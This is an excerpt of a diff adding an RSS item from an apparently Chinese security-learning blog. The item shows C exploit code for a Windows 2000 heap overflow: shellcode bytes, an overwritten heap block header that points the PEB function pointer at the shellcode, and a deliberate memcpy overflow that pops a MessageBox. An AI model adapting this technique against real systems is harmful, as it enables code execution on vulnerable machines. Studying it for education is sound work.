+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// 200 字节堆区结束，以下是溢出数据
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x16\x01\x1A\x00\x00\x10\x00\x00&lt;/span>&lt;span class="s">&amp;#34;&lt;/span> &lt;span class="c1">// 下一个堆块的块首，保留
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x88\x06\x36\x00&lt;/span>&lt;span class="s">&amp;#34;&lt;/span> &lt;span class="c1">// ShellCode起始地址
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x20\xF0\xFD\x7F&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// PEB同步函数指针位置
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HLOCAL&lt;/span> &lt;span class="n">h1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">h2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HANDLE&lt;/span> &lt;span class="n">hp&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HeapCreate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x1000&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x10000&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">h1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HeapAlloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">HEAP_ZERO_MEMORY&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">200&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// __asm int 3 //used to break process
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">h1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">shellcode&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x200&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">//overflow,0x200=512
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">h2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HeapAlloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">HEAP_ZERO_MEMORY&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="总结-2">总结&lt;/h4>
+&lt;ul>
+&lt;li>这就是完整的ShellCode了，可以顺利利用Win2000的堆溢出弹出MessageBox了&lt;/li>
+&lt;/ul></description></item></channel></rss>
